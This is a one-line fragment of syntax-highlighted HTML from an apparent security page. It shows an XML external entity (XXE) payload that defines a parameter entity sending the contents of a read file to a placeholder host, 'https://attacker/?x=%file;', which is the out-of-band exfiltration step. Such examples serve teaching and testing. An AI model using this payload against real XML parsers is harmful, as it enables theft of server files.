<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;!ENTITY % eval &quot;&lt;!ENTITY </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">&amp;#x25;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> exfil SYSTEM &#39;https://attacker/?x=%file;&#39;&gt;&quot;&gt;</span></span>
